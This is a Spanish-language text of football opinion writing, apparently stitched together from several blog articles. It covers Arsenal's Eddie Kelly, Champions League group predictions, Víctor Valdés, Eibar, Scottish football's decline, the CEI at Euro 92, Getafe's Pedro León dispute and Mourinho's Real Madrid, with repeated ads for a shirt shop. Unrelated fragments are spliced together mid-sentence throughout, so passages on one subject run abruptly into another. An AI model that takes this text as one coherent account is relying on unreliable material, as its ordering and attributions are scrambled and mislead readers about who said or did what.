corte más bien rugoso que jamás se distinguió por sus grandes aventuras camino de la meta rival (13 goles en 177 partidos con el Arsenal) pero supo parar el reloj a principios de los setenta. Kelly, 19 primaveras y tan solo una temporada a cuestas en el primer equipo encarriló, con una belleza, el partido que daba carpetazo a una sequía de 17 años. Frente al Clock End de Highbury anotaba el primero de aquel 3-1 ante el Anderlecht (4-3 contando el partido de ida) en la final de la Copa de Ferias del 70 y brindaba al Arsenal su primera copa europea. Por si fuera poco al año siguiente, en Wembley contra el Liverpool, saltaba desde el banquillo para aplicarle la respiración asistida a una final que se escapaba. El galés abrió el camino para que  Charlie George enviara aquel trofeo a la vitrina con un derechazo de antología. Se puede decir que el calvito de las visitas guiadas estuvo ocupado al inicio de su vida profesional.Y a partir de ahí, del highlight insuperable, un desempeño que languideció progresivamente. Quizá sea precisamente esto lo que hace legendario el cromo. A pesar de embolsarse dos títulos de liga y acceder a la capitanía del primer equipo con solo 23 años (marca que solo superaría Tony Adams años más tarde) su carrera entró en evidente declive tras la proeza. Magullado por varias lesiones, acabó perdiendo su sitio en el once y haciendo las maletas en 1976 para probar suerte en el Queens Park Rangers.La batalla va a ser terrible.Pronóstico: Bayer Leverkusen y Chelsea.Grupo F: La màxima competición ha resultado desde el principio un bálsamo para el Arsenal. La previa apaciguó el pesimismo generado por la venta de Cesc, y la buena marcha europea compensó el terrible inicio del equipo, que ha resurgido de la mano de un impresionante Van Persie. La cruz le ha caído al Borussia Dortmund, que ha notado el cambio de nivel y mañana lo tiene casi imposible: debe ganarle al Olympique por al menos cuatro goles de diferencia y esperar que el Olympiacos no le saque al menos un punto al Arsenal. Si no ocurre esta eventualidad tan extraña, el Marsella entrará segundo siempre que obtenga como poco un punto menos que los griegos. No será empresa fácil, porque es de suponer que los de Klopp saldrán a morir en el Signal Iduna, y son un gran equipo.Pronóstico: Arsenal y Olympique.Grupo G. No es casualidad que el grupo más débil de la competición contenga también la mayor sorpresa. El Apoel parecía antes de comenzar el ejemplo paradigmático de que el nuevo criterio de Platini es absurdo, y ahora resulta ocupan orgullosos la primera plaza, ya clasificados para unos octavos que les parecerían utópicos a priori. El partido a cara de perro es en el Dragao, entre el titubeante Oporto post-Villas Boas y un Zenit que viene envuelto en polémica a cuenta de una payasada de Danny. El que gane está dentro, la igualada envía a los locales a la Europa League. En cualquier caso, no hay que descartar empate o derrota del Apoel ante un Shakhtar que técnicamente es muy superior, a pesar de su horrible prestación en la competición; entonces el vencedor del otro partido, si lo hubiere, podría incluso ser campeón de grupo. Lo que parece claro es que estos equipos van a resultar muy queridos en los bombos de un próximo sorteo.Pronóstico: Apoel y Oporto.Grupo H. El campeón afronta el último partido de la primera ronda con la mirada apuntando al Clásico del Bernabéu, y poco aliciente habrá en el Camp Nou más allá de ver a los chavales del filial vistiendo la zamarra del primer equipo, y enterarse de por dónde anda Borisov. Los culés ya dieron la campanada donde debían, en San Siro, pero el grupo ya andaba tan desequilibrado que los chicos de Allegri también van a Pilsen mayormente a que le enseñen las fábricas de cerveza.Condenaron a esos mocetones a salir de la sombra de su portería, a abandonar los palos, a tratar el balón como lo haría un defensa. Y ahí cambió todo. Hasta hubo un momento en que se valoró a Busquets. Cómo decirlo, si Víctor Valdés es un iPhone, Busi era un Alcatel One Touch Easy. Pero de alguna forma sentó las bases de un nuevo cancerbero total, último defensa, con más rigor en la salida del balón y muchas más responsabilidades. Esos años, ese proceso, cambió el perfil de portero. Illgner estaba bien para un rato, pero fue Casillas –un portero joven, adaptado al nuevo medio- el que deslumbró al Bernabéu tras experimentos con Bizarri. Un perfil, por cierto, perfectamente trabajado en Valencia gracias a un exportero que en verdad es un teórico bajo los tres palos como es Ochotorena, que tiene buena culpa del buen rendimiento de los guardametas en la casa ché.Hablaba de los porteros españoles, pero también de los que vinieron o los que están. Esta temporada nos parece resultón Munúa, un portero que siempre apuntó maneras y que un episodio turbio con Aouate le condenó al ostracismo y que ha sabido regenerarse de una forma estimable. O Diego Alves, ese porterazo brasileño que junto a Julio César han conseguido eliminar del inconsciente colectivo esa máxima de que Brasil son diez figuras más un portero. El acierto del Atlético con Courtois, una promesa que partido a partido va convirtiéndose en realidad palpable, o la presencia de un poco brillante pero regular Willy Caballero en un equipo con aspiraciones a todo como es el Málaga.Uno mira la portería inglesa, la lenta sustitución de Buffon en Italia, la inconsistencia de Neuer en Alemania, y piensa en la tranquilidad de tener un guardameta eficaz, se llame Casillas, Valdés o el futurible De Gea. Cuando no sé de qué escribir escribo sobre porteros, y mirando nuestra liga, no puede ser una tarea más sencilla, y hasta edificante. Me queda mirar hacia delante, y pensar en el futuro, y os lanzo una pregunta. ¿Cuál es el futuro de la portería en cuanto a españoles? ¿Son Joel, De Gea o Varas el futuro de nuestra selección? Y en el extranjero, ¿qué porteros os están llamando la atención? Además de Lloris, uno de mis favoritos, qué hay por ahí que pueda marcar historia como lo hicieron Buffon, Van der Sar o Barthez hace no mucho. Los salvapatrias no me gustan un pelo. Esos líderes que llegan a los sitios casi sin bajarse del caballo, arengando, reflotando a los maltrechos, inmaculados, elegantes en sus gestos, casi tocados por algún dedo divino, los elegidos para levantar una institución en decadencia; esos agigantados personajes cuya misión –complicada siempre- le hacen agravar el rictus y que perdonan la vida a cada paso, esos, me sacan de quicio. Me gusta el trabajo laborioso y humilde, me gustaba Pellegrini aunque esté un poco demodé confesarlo.Para culminar el fin de semana, solo unas horas después se anunciaba la renovación de su contrato hasta el año 2018. Joaquín. Se fue unos años a conocer mundo, volvió, y parecía que nunca se había marchado del Villamarín. En su primer partido desde el retorno a casa, el portuense aportó ese punto de veteranía que todo equipo recién ascendido agradece. Además, puso en bandeja el gol de la victoria bética a Rubén Castro, con un balón colgado desde su banda querida teledirigido hacia la cabeza del punta canario. Su aporte al equipo de Mel va más allá del meramente deportivo. Su presencia es un plus intangible pero importantísimo para el Real Betis.Raúl García. Debutaba el último fichaje del Athletic Club con su nuevo equipo y dio la sensación de que el navarro llevaba toda la vida jugando en San Mamés. Perfectamente ensamblado en el esquema de Valverde, justo por detrás de Aduriz, su dinamismo cerca del área rival y su capacidad para finalizar jugadas promete dar muchas alegrías en Bilbao. Es un fútbol, el del Athletic, absolutamente idóneo para su nuevo futbolista. Para redondear su debut, su primer gol como león.Roberto Torres. ¿Has visto el GOLAZO del osasunista para adelantar a los suyos ante el Leganés y poner al equipo pamplonica líder de Segunda? Pues si no lo has visto aún, deja de perder el tiempo. Ocurrió hace ya más de doce años. Un jovencísimo Víctor Valdés (L’Hospitalet de Llobregat, 1982) había conseguido, en contra de todas las previsiones, hacerse con la titularidad en la portería del FC Barcelona desde el arranque de la temporada en detrimento del argentino Roberto Bonano. Fueron once jornadas ligueras en las que el meta canterano, superando la habitual minuciosidad con la que el graderío del Camp Nou suele desmenuzar a sus aspirantes a arqueros, parecía estar asentándose en una de las porterías más exigentes y arriesgadas del planeta. Hasta que de pronto y sin mayor motivación aparente que la de ‘ayudar’ al joven futbolista a superar la presión que podía suponerle la misión de salvaguardar la portería azulgrana semana tras semana, Louis van Gaal decidió que Víctor debía dar un paso atrás y volver al filial. Aquella decisión técnica no sentó bien a un futbolista que siempre destacó por un carácter especial. Víctor plantó cara y, en un acto de indisciplina, decidió no acudir al entrenamiento que el técnico del segundo equipo azulgrana, Quique Costas, había programado para la mañana siguiente.Valdés aún estaba hormigonando los cimientos de su carrera profesional. Con su actitud indisciplinada estaba llamando la atención a gritos, estaba pidiendo ayuda y consuelo de forma desesperada y sin querer admitirlo, de esa manera de peculiar y característica en la que suelen pedirla los adolescentes atormentados y fuera de sitio. Fue un primer ramalazo de una personalidad ideal para conjugarla con la profesión de portero. Un caramelo dulzón a la hora de buscar apoyo para escribir sobre su figura. Porque Víctor jamás buscó el afecto y la comprensión a través de una sonrisa o de un gesto amable. Lo hizo como él es, a su particular manera. Ahuyentándose para ser reclamado. Apartándose en un rincón, cabizbajo y con el ceño fruncido. Mirando de soslayo por si alguien tenía a bien acercarse a tenderle una mano y preguntarle qué le ocurría. Enrabietado en una desesperante espiral viciosa si su maniobra no conseguía la reacción pretendida a su alrededor. Y no se le puede reprochar, sobre todo viendo su trayectoria desde la perspectiva de la distancia.Porque no ha tenido el FC Barcelona portero más regular, decisivo y angular en la maceración de sus éxitos que Víctor Valdés. Bajo su sombra se construyó el modelo de guardameta moderno que impera hoy día. El que asume el riesgo de su posición con valentía, superando el miedo al error y viviendo un desafío constante entre su carismática personalidad y una presión a la que domina desde su pose chulesca. Han pasado exactamente diez meses desde que el portero de L’Hospitalet cayese lesionado de gravedad en el que acabaría siendo su último partido como barcelonista. Diez meses en los que Víctor, con la rodilla destrozada, volvió a recluirse en el rincón al que acudía enfurruñado cada vez que necesitaba un gesto de complicidad o un poco de cariño. Fiel a su carácter y a su manera de afrontar los problemas, no acudió a solicitar la ayuda de nadie. Decidió acorazarse para trabajar con la mente puesta en su regreso, corajudo y orgulloso como en él es habitual. Quizá lo hizo esperando a que alguien reparase en su ausencia, se acercara, se acuclillara frente a él y pasando su mano por su espalda, con un gesto cariñoso y cercano, decidiese preguntarle ‘¿qué te pasa, Víctor?’ . Doce años después, tuvo que ser van Gaal.Si eres de esa gente rara y medio proscrita que prefiere evitar los goles a marcarlos, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, tienes un amplísimo catálogo de camisetas de portero para escoger la tuya. Desde Valdés hasta Casillas, pasando Schmeichel, Courtois o Buffon. Su carrera parecía condenada a ese anonimato profundo y oscuro que procura la muy desagradecida Segunda división B, esa categoría que, por no tener, no tiene ni un nombre propio, sino que hereda el de su distanciada hermana mayor. Todo parecía encaminado a, lo habitual en estos casos, una meritoria trayectoria por cuatro o cinco equipos de la categoría, alargar la carrera a base de tirar de experiencia y buena colocación y terminar cerrando el círculo con las rodillas destrozadas y las sienes repletas de muescas pero dejando un buen recuerdo entre las aficiones de Lepe, Cádiz, Murcia… Nada que no hayamos visto ya un buen puñado de veces.Raúl Albentosa Redal (Alzira, 1988) se fue el sábado de Ipurúa conteniendo el llanto. Tras temporada y media vistiendo la camiseta del Eibar, parece que saldrá del club guipuzcoano con destino al Derby County, club puntero de la Championship inglesa. Sus buenas actuaciones, su solvencia en el eje de la zaga y su contundente corpulencia habían llamado la atención en estos últimos meses no solo de los Rams, sino de varios equipos de nuestra Liga. Instantes después de deshacerse del Getafe (2-1) con un sufrido partido, alguien a pie de campo cuestionaba al defensa armero sobre su inminente salida del club que le dio la oportunidad de salir de aquel infumable anonimato de la Segunda B cuando jugaba en el Cádiz, de aquel dejarse la vida cada domingo para seguir siendo un desconocido. Y Albentosa, tomando plena conciencia de la situación, zanjó sus palabras de agradecimiento mordiéndose los labios para evitar la lágrima en directo y sobre el césped pero dejando aflorar sus sentimientos con toda la naturalidad del mundo. Y pareció normal, sincero, transparente. Como nos hubiese pasado a ti o a mí. Porque en el Eibar todo es extremadamente normal. Da la sensación de que por los estrechos y escasamente iluminados pasillos de Ipurúa la gente se pasea en pantuflas. No hay aspavientos, no hay dobleces, no hay reservas ni actitudes para la galería, no hay conversaciones a boca tapada. Y son octavos cuando está a punto de cerrarse la primera vuelta del campeonato. Lo normal. Los ingleses inventaron el foot-ball, mero entretenimiento de la población, pero fueron sin duda los escoceses los que le dieron vida y empaque. De la húmeda Escocia surgieron todos los detalles que fueron dando forma al juego ideado al otro lado de los Borders. Detalles que permitieron que el fútbol creciera, se desarrollara y cogiera vuelo hasta convertirse en el deporte de masas y acontecimiento social que es hoy, siglo y medio después. Desde Escocia llegaron aquellos precursores del profesionalismo que, enrolados de forma mayoritaria en las filas del por entonces poderoso Preston North End, convirtieron a los de Deepdale en el club más poderoso de finales del siglo XIX.El premio menor de la Europa League lo tiene casi garantizado el equipo checo, toda vez que una victoria del BATE en Barcelona resulta casi inconcebible. Para ellos estar ya ha sido bastante premio.Pronóstico/certeza: Barça y Milan. Nada mejor el día del partido inaugural de este mundial que recordar el aldabonazo de Camerún en Italia 90, que ya desde el primer día, en el incomparable escenario de San Siro, avisó de que algo estaba despertando en el continente africano. El vuelo de Omam-Biyik –que por cierto anda entrenando en México- ha quedado como icono de aquel sueño que al final no fue para tanto. En cualquier caso, una de las grandes sorpresas de la historia del torneo, con el campeón doblando la rodilla ante una pléyade de desconocidos. Concluimos aquí la previa individualizada de los protagonistas de los clásicos que se avecinan.Valdés. Si algo no podrá discutírsele nunca al recio guardameta de Hospitalet, es que acabó con un debate sobre la portería que se estaba volviendo ancestral. Jugador de caràcter, estupendo en el uno contra uno, ágil como un felino y con capacidad de mando, ha ido espaciando poco a poco las lagunas de concentración que le condenaban en sus primeros años, hasta quedarse a un dedo del nivel de Casillas. Decisivo con frecuencia en los grandes partidos, verle de tercer portero en la Roja por detrás de Reina es una broma, que puede tornarse muy pesada si falta algún día el Santo en algún partido importante.Pinto. Prototipo del portero suplente que siempre desea un entrenador, que no chirría cuando tiene que jugar y no la monta en el banquillo. Ya le avalaba una buena carrera cuando llegó al Barcelona, firmó su contribución a la Copa del sexteto con aquella parada en Mallorca, y esta temporada las lesiones del titular le han dado un poco más de carrete. Un portero correcto, que detiene las parables que decía Fenoy, y cuya titularidad en la final del miércoles es un acertijo cuya respuesta sólo conoce Pep. Su única mancha, el asunto de los silbidos.Maxwell. Llegado del Inter para reforzar quizá la posición menos destacable en un equipo casi perfecto, hoy han pasado dos años y la mejora esta temporada en el lateral izquierdo de la zaga ha obedecido más al repunte de Abidal, que ha desarrollado una excelente labor en el puesto cuando tanto él como Puyol estaban sanos.Los Scotch Professors cambiaron la naturaleza del fútbol con su atrevido y descarado passing game. Introdujeron el juego colectivo para potenciar la fuerza del equipo en contraposición con el estilo cien por cien individualista y directo que imperaba en Inglaterra, mucho menos evolucionado en su concepción táctica. Más tarde llegaron los grandes maestros a la poderosa competición inglesa. Los técnicos que habrían de dar un nuevo giro de tuerca a un fútbol que amenazaba con anquilosarse y quedarse para siempre anclado en las tinieblas. Primero Matt Busby, el hombre que cambió para siempre al Manchester United. Después siguieron leyendas como Bill Shankly, el responsable de la definitiva modernización de las instalaciones de Melwood y de los métodos de perfeccionamiento y entreno del Liverpool, y, sobre todo, Alex Ferguson, tal vez el paradigma del General Manager del fútbol moderno. Todos ellos tan escoceses, y orgullosos de serlo, como una botella de Speyside.Hace casi cuatro años que no se disputa el Old Firm. Tras la disolución del Glasgow Rangers y el reinicio de la historia del lado protestante del fútbol glaswegian, el Celtic quedó, en cierto modo, liberado de exigencias. Desde entonces, sus temporadas ya no se dirimen en función de los durísimos enfrentamientos directos con sus vecinos del otro lado del Clyde. El torneo liguero escocés ya no es un partido a cuatro sets con un puñado de convidados de piedra. La ausencia del máximo rival ha influido negativamente, como no podía ser de otro modo, en el nivel competitivo del Celtic. Sigue recogiendo títulos ligueros año tras año, sí, pero no domina con mano férrea, como se presuponía, ante rivales notablemente inferiores. Las dudas aumentan porque su falta de estímulo ha repercutido en su rendimiento. Sin oposición real, el club aparece entregado a la molicie empuñando torpemente una pinta de Magners.La situación se agrava cuando los Bhoys salen a competir por el continente. Son ya dos campañas consecutivas las que el equipo dirigido por el noruego Ronny Deila se queda fuera de la fase de grupos de la Champions League, eliminado la pasada campaña por el Maribor y en la actual por el Malmö en la última ronda previa. Tampoco ese escalón inferior que es la Europa League parece tener hueco para el paupérrimo nivel del actual fútbol escocés. Eliminado en dieciseisavos de final por el Inter el pasado curso, en el actual las cosas incluso han empeorado. Disputados cinco partidos de la fase de grupos, el Celtic no ha conseguido una sola victoria y ocupa la última plaza de su grupo, sin posibilidad ya de pasar a la siguiente ronda. Su triste papel personifica el ocaso absoluto del fútbol escocés. Y hablamos del club más poderoso de Escocia, pero el panorama es aún más desolador si reparamos en el resto del fútbol caledonio. Alejado desde tiempo atrás de la primera plana europea. Incapaz de competir contra equipos con mucho menor bagaje histórico y masa social. Anclado en una mediocridad, agravada por los problemas económicos que han azotado a entidades de primer nivel como Rangers o Hearts, de la que no parece haber salida a la vista. Sin dinero en caja ni, por fortuna para algunos, grandes inversores extranjeros dispuestos a comprarse un juguete y soltarlo en una liga que se ha convertido prácticamente en invisible para el resto de Europa. Sin posibilidad de ofrecer un producto digno y venderlo a las libras de las grandes plataformas televisivas porque, sencillamente, no hay competición. Sin capacidad de retener en la liga a los mejores futbolistas nacidos en suelo escocés porque el dinero de Sky con el que juegan los clubes ingleses no permite capacidad de respuesta. Sin posibilidad, como antaño, de que surja prácticamente de la nada un Dundee United subcampeón de la Copa de la UEFA o un Aberdeen campeón de la Recopa.Escocia ya no tiene nada que ofrecer, futbolísticamente, al resto de Europa. Ya nadie mira al fútbol escocés con admiración. Ya nadie se pelea por contratar a los revolucionarios técnicos del país. El juego ha terminado pasándolos por encima. Engulliendo su profunda identidad sin miramientos. Convirtiendo el espectáculo de los campos escoceses en un romántico anacronismo.El declive del fútbol escocés no tiene reflejo en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Puedes encontrar un completísimo catálogo de camisetas y productos de casi cualquier equipo de Escocia. Pedro León Sánchez (Mula, 1986) es un buen futbolista. Es más, probablemente sea el mejor futbolista de la plantilla del Getafe CF. Porque pese a que la LFP negó la inscripción de su ficha en la competición al club madrileño, por haber rebasado éste el límite salarial de 17 millones de euros impuesto para el control del fair-play financiero, el centrocampista murciano sigue siendo miembro de la plantilla azulona. Y es precisamente ahí donde radica el quid de todo el galimatías, el punto sobre el que Ángel Torres se apoya para tratar de mover el mundo. Enrocado en su posición de poder, el máximo dirigente azulón era plenamente consciente de la necesidad de deshacerse del futbolista durante el pasado mercado de fichajes. Tanto era así, que a principios de verano mercadeó con el jugador ofreciéndolo al mejor postor con el objetivo de obtener el mayor beneficio económico para su club, algo absolutamente lícito y comprensible, por otro lado. La pretensión de Torres chocó frontalmente con la rotunda negativa de Pedró León a aceptar un traspaso a Rusia, China o Emiratos Árabes, por considerar que estas ligas, las únicas dispuestas a ofrecer las cantidades exigidas por el presidente para el cierre de la operación, quedaban todavía muy por debajo de su rendimiento deportivo, más acorde éste a las oferta, considerablemente menor, del Hannover 96 que presentó el propio futbolista. Tan lícito y comprensible como lo pretendido por su club.Y en medio de todo este embrollo, con el jugador ‘bloqueado’ por la LFP (propuesta sorprendentemente apoyada por Torres, en un gesto claramente vengativo) pero en aún en nómina del club getafense, cobrando pero obligado a no poder desarrollar su trabajo, Ángel Torres intentando torpemente lavar su orgullo y su imagen de supuesto gestor modélico y salpicando la historia de contradicciones. Confieso que nunca he sentido especial predilección por el presidente azulón.Más tarde el Leicester (donde llegó a compartir vestuario con un floreciente Gary Lineker y la futura leyenda del Arsenal Alan Smith) y el tobogán: Notts County, Bournemouth y Torquay, donde pegó sus últimas carreras antes de retirarse definitivamente. Por el camino un récord aun inaccesible, el cariño de la grada y miles de anécdotas. Si pasan por Ashburton Grove y atienden quizá les cuente algunas. Andar jodido por un amor que nació roto y se rompía más a cada paso que daba. Al que incluso los destellos le hacían desconcharse. El que no iba a ninguna parte. Resulta sencillo identificarse con la Comunidad de Estados Independientes, el equipo que envió el agonizante fútbol soviético a la Euro 92 porque todos hemos estado en esa mierda.Kharine y Kanchelskis;  Dobrovolski y Mykhaylychenko, Viktor Onopko… Ocho rusos, seis ucranianos, piezas con los bordes destrozados por tratar de resolver el puzle a hostias. Aquella pandilla caduca al nacer viajó a Suecia para morir matando. Vestidos con una camiseta sin escudo, sin canción ni bandera con la que conmoverse como idiotas en el travelling tribunero, los que ya no eran rusos ofrecieron su última función. Sobre el ‘Himno a la alegría’ de Beethoven, sucedáneo de un canto que jamás existió, el equipo de un país que no era intentó salvar los muebles por última vez. Lo hizo con esta camiseta roja que hoy es fetiche de culto.Un breve en ‘Mundo Deportivo’ pintaba bien el panorama para aquel equipo provisional, la mística que lo envolvía y que aún lo envuelve. “¿Cómo animar a la CEI? : Los aficionados de la ex-URSS no saben cómo animar a los jugadores de la CEI. No es lo mismo animar cantando ‘Alemania, Alemania’ o ‘Inglaterra, Inglaterra’ que ‘Comunidad de Estados Independientes’. Los 500 seguidores del equipo de Bishovets se conformaron en el partido ante Alemania con-aplaudir acompasadamente y gritar ‘Sheinu’, que traducido quiere decir ‘Dadnos un gol’”“No vamos a jugar por dinero. Queremos que la última aparición de la CEI sea digna”, declaró Shalimov que acaba de llegar al Inter por doce millones de euros, antes de jugar contra Alemania en el primer capítulo de la aventura. No mentía. Los alemanes eran poca broma con Klinsmann y Effenberg al mando, pero solo pudieron equilibrar el gol de Dobrovolski, greña y vida nocturna mítica, en el último minuto. Hassler tuvo que ponerla en la escuadra con un saque de falta insuperable. La CEI había escogido como alojamiento en Suecia el mismo hotel que habían disfrutado los brasileños cuando ganaron el Mundial 58, pero lo suyo era otra cosa. Cerrojo y contragolpe fino. “El espectáculo que lo den los grandes, yo quiero ganar”, protestaba el seleccionador del invento, Bishovets,  atajando las críticas. Dicho y hecho. Pese al ambiente enrarecido de una previa en la que el gobierno ruso decidió retirar la bandera común para colgar su tricolor irritando notablemente a los ucranianos y poniendo en peligro el futuro del equipo en el torneo, lograron empatar sin goles frente a la Holanda de Gullit, Van Basten y compañía para llegar vivos al último partido. La matemática era sencilla y estimulante. Si ganaban 2-0 a Escocia estaban dentro; los escoceses estaban eliminados y solo jugaban ya por honrar la camiseta.Siempre me ha parecido, maniobra tras maniobra, que no era trigo limpio y que algún interés personal ya no tan oculto subyacía bajo su carrera como dirigente del Getafe. La jugada con Pedro León, al que prometió un salario que no tenía capacidad para cumplir y por el que no pagó cantidad alguna en concepto de traspaso al Real Madrid y ahora pretende sacar jugosa tajada, deja clara la ausencia de escrúpulos de Torres.Mientras, él se apoya en las imposiciones del Consejo Superior de Deportes y en los límites fijados por el control financiero de los clubes para ejecutar su fría venganza sobre el futbolista murciano. Utiliza herramientas ajenas y, no contento con ello, echa balones fuera cuando se le consulta sobre el asunto, pero escurre el bulto a la hora de depurar responsabilidades sobre una gestión económica que, ahora se descubre el pastel, mantuvo al Getafe viviendo por encima de sus posibilidades reales durante no pocas temporadas. No se explica si no cómo consiguió cerrar las incorporaciones de no pocos futbolistas que, acabando contrato en sus clubes de origen, decidieron aceptar la oferta de un club que parecía estar en condiciones de incrementar notablemente sus emolumentos. Y es ahí, en esa aparente impunidad y en esas ansias por crecer de manera descontrolada, donde debería profundizarse. Sin dejar víctimas de daños colaterales en las cunetas. Tony Sanabria. ¡Qué bien le pueden venir al Sporting los goles del delantero paraguayo cedido por la Roma! Ayer, en apenas ocho minutos, encarriló la primera victoria gijonesa de la temporada con dos goles de delantero de área, ambos calcados, al rematar desde dentro del área pequeña dos caramelitos servidos por el capitán Alberto Lora desde el costado derecho. Pese a su juventud, apenas diecinueve años, el excanterano del Barça juega con el aplomo de un veterano curtido en mil campos. Él necesita minutos de calidad y el Sporting necesita goles. La incógnita de la ecuación se despeja por sí sola.Léo Baptistao. Saltó al césped, después de un actuación discutible en Viena, en sustitución del lesionado Bakambu. Y, a diferencia de lo que ocurrió en el partido europeo del pasado jueves, esta vez sí se reivindicó con una actuación portentosa. Al poco de salir, provocó el penalti de Carlos Gurpegui con una escurridiza incursión en el área y de una asociación con Adrián consiguió remachar una contra para el tercer gol de los suyos. Aún está a tiempo de relanzar su carrera y el escenario del Madrigal parece propicio.Marc Bartra. No debe ser sencillo ser Marc Bartra. Primero, porque la sombra de Carles Puyol es tan alargada y profunda que impide, por el momento, percibir cualquier destello en el yermo paraje que dejó tras su adiós al FC Barcelona. Y segundo, porque estando tan expuesto al fallo como lo está un central azulgrana, su rendimiento es minuciosamente observado en cada minuto de los que dispone sobre el verde. No es que no esté capacitado, es que a un central azulgrana siempre se le pide un poco más. Ante el Levante sujetó la zaga y, además, consiguió abrir el melón con una certera cuchillada. Un gol de esos que a la larga aparecerá eclipsado por lo que después vendría a cargo del de siempre, pero que encierra un valor importantísimo.Javi Guerra. Los funcionarios del gol siempre responden a lo que se les exige. Pueden cambiar de camiseta, de compañeros, de escenario… pero su instinto y su funcionalidad permanecen intactos.Javi Guerra es uno de esos delanteros acostumbrados a ofrecer buen rendimiento allá por donde pasa. Lo hizo en el Levante, en Valladolid, en Málaga y parece dispuesto a hacerlo en Vallecas. Su solitario gol anoche en Las Palmas fue suficiente para sacar al Rayo del agujero y obtener la primera victoria de la Franja en la temporada. La tuvo y, al límite del fuera de juego, la enchufó. Justo lo que se le pide a un delantero.Fernando Torres. ‘¿Dónde estaba este Fernando Torres cuando estaba en el Chelsea? ‘, se preguntaban ayer en la prensa inglesa. Porque el Fernando Torres que se pudo ver sobre el césped de Ipurúa recordó por un instante al Torres mayestático de finales de la pasada década. De su mágica e inesperada asociación con un novato como Ángel Correa (ambos fueron el revulsivo de Simeone en la segunda mitad eibarresa) llegó una victoria trabajadísima para su equipo. Soy bilbaíno, del mismo Indautxu, e hincha del Athletic. Vamos a ponernos en situación antes de nada para que no haya sorpresas inesperadas. Quizá no sea un hincha normal. Soy un seguidor muy exigente y crítico, de los que le pido a mi equipo más de lo que probablemente esté capacitado para darme. Puede que esa enfermiza tendencia al perfeccionismo y esa adicción al trabajo que atormenta mi día a día personal haya condicionado muy seriamente, para mi particular desgracia, mi manera de entender la afición por un club de fútbol. Si haces algo que sea para hacerlo lo mejor posible y no dejes nunca de intentar mejorarlo, de seguir creciendo en ese aprendizaje continuo que es la vida. No quiero que mi Athletic viva en una disculpa eterna. Detesto que navegue cómodo por aguas tranquilas amparándose en las limitaciones autoimpuestas por su peculiar idiosincrasia y aumentadas el insurrecto Jean-Marc Bosman y que crezca resignado dando por hecho que los laureles exhibidos antaño jamás volverán a ser verdes. Siento que el Athletic moderno no asume su responsabilidad con una hinchada abnegada y, como decía Marcelo Bielsa, tan tremendamente inocente que jamás pondría en duda su vinculación con el club.Tal vez las generaciones más jóvenes no lo sientan así. Yo crecí y me aficioné al fútbol con Dani, Miguel de Andrés, Estanis Argote, Andoni Goiko o Rocky Liceranzu y aquel equipo de las dos Ligas de mediados de los años ochenta.Aquella historia de amor imposible trastabillaba, pero parecía avanzar hacia alguna parte.Entonces sonó el teléfono. Lo esperabas pero no ese día, descuelgas y sabes que la historia se ha terminado. La CEI conoció su diagnóstico a los 20 minutos de partido. Karine, que había estado impecable durante todo el torneo, sintió como el balón rebotaba en su cuerpo antes de convertirse en el 1-0. Fue el preludio del desastre. Sin ritmo alguno, tan desnortados como pudiera estar aquel equipo sostenido con alfileres, la ex-URSS fue resquebrajándose lentamente en cada arreón escocés. Entregándose a lo inevitable. McClair hizo el segundo, el árbitro se borró en dos penaltis clarísimos a favor de los rojos, llegó el tercero en la agonía del encuentro… Cuando el reloj del viejo el viejo Iddrotsparken marcó el 90, la CEI colgó el teléfono y el romance como lo habíamos conocido era historia. Quedaron el regusto amargo de lo que podría haber sido y veinte maletas en el suelo con destinos dispares. Otra vida.En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, puedes encontrar la camiseta que usó la CEI en aquel torneo y muchas más. Gareth Southgate the whole of England is with you. Si los 75.000 que estaban aquella tarde en Wembley hubieran callado por un momento la grada aun seguiría devolviendo al campo un rumor de corazones. Hace quince años del asunto y Southgate sigue enfilando hacia el punto de penalti con el garbo y confianza necesarios para embocar aquel tiro, hace quince años del asunto y Southgate sigue estrellando miserablemente la pelota en la manopla de Köpke. Oh it’s saved, saved, saved. Hace quince años de aquella semi y Venables se sigue cagando en la leche. En ediciones de dvd lujosas, en vídeos subidos torpemente a la red y en la memoria colectiva de la futbolerada inglesa. Umbro había tejido una suplente especial con tres leones en el pecho para amarrar la Euro 96, no cuesta mucho imaginar lo que esa camiseta gris significa para el inglés tras la enésima cagada.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente.Entiendo que un espectáculo tendente al circo como el fútbol necesite esos artistas de la rueda de prensa, esos milimétricos bocazas, llenan portadas y lo que es más importante: convencen a los aficionados. Porque nosotros, los parroquianos, esgrimimos tópicos para defender a nuestros equipos. No somos de florituras gramaticales, ni de lógicas filosóficas. Somos irreductiblemente cafres hasta cuando queremos ser objetivos. La objetividad: auténtico El Dorado futbolístico.Decía Valdano que el fútbol es un estado de ánimo. Y por esta vez tiene razón. Ayer en el partido del Milan tuve la sensación de que Mourinho estaba haciendo un gran trabajo. Su labor como entrenador es tan pornográfica que a veces se nos olvida que debajo de todo ese espectáculo onanista y exhibicionista hay un técnico trabajador y perseverante. El ataque rápido y la defensa solidaria son síntomas de que este Madrid es un equipo sin demasiadas objeciones. Tres líneas acopladas que interactúan con fluidez, que se comunican con inteligencia, que se justifican unas a otras. Si fallan los de delante ayudan los de detrás, si se equivocan los de detrás llegan a disculparlos los de delante. Fútbol en estado puro: sensación de equipo, de dureza y de indisimulada felicidad.Como decía, no me gustan los salvapatrias, ni los redentores, ni el exceso de lengua para ocultar, como un trilero, alguna carencia del equipo. Pero un entrenador que logra por fin centrar a un descarriado como Marcelo, que le da galones a Özil, que ficha a un veterano Carvalho seguro de su rendimiento, merece algo más que ser reconocido por sus premeditados enojos. El pasado de Mourinho era un síntoma pero no un diagnóstico. Hay entrenadores que lo fueron todo y que fueron incapaces de levantar el cuerpo inerte de un club en decadencia. El Real Madrid estaba fuera de onda. Abotargado, con galactitis, tras un periodo de zozobra institucional y deportiva. No había garantías de que el portugués fuera el hombre, igual que el año pasado no lo fue Pellegrini por más puntos que metiera en su zurrón. Se necesitaba algo más que confiar en la pegada de los buenos, se necesitaba identidad y camaradería, elementos que ayer vi sobre el césped del Bernabéu.No sé cuanto durará el espectáculo. En su contra, tengo la sensación de que el once está demasiado definido, que falta confianza en los suplentes. Ayer se desentumeció Granero, Pedro León apunta a mucho más y Benzema no da ni una alegría a sus defensores, entre los que me encuentro. Mourinho está explotando lo que tiene, su Special Eleven: Casillas, Ramos, Carvalho, Pepe, Marcelo, 